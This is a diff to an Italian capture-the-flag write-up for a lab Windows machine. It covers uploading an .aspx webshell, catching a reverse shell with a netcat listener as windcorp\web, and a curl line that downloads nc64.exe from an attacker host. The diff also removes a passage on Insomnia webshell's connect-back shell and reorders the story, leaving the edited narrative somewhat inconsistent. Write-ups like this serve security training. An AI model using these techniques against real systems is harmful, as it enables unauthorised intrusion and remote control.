@@ -67,7 +67,16 @@ Individuo il path pubblico guardando dove finiscono gli altri file media del sit
 Webshell: http://10.10.11.147/Data/Sites/1/media/foto.aspx
 ```
 
-Provo subito una reverse shell PowerShell base64 — bloccata da Defender. `Invoke-WebRequest` non esce. `nc64.exe` non connette outbound. Qualcosa blocca pesantemente l'ambiente — enumero le difese prima di procedere.
+La richiamo ed ottengo una shell come web.
+
+```bash
+nc -lvnp 80
+# Connection received on 10.10.11.147
+# Microsoft Windows [Version 10.0.20348.643]
+# windcorp\web
+```
+
+ Successivamente noto che molti comandi son bloccati,c'è qualcosa che non mi convince..
 
 ### Enumerazione difese
 
@@ -114,17 +123,6 @@ Il quadro completo:
 
 ```cmd
 curl http://10.10.14.X/nc64.exe -o C:\Windows\Temp\nc64.exe
-```
-
-### Insomnia Webshell → Shell
-
-Carico **Insomnia webshell** con lo stesso metodo di prima (`.png` → copia come `.aspx`). Insomnia gira nel contesto del processo IIS, che non è nella lista dei blocchi firewall. Uso la funzione built-in "Connect Back Shell":
-
-```bash
-nc -lvnp 80
-# Connection received on 10.10.11.147
-# Microsoft Windows [Version 10.0.20348.643]
-# windcorp\web
 ```
 
 ***
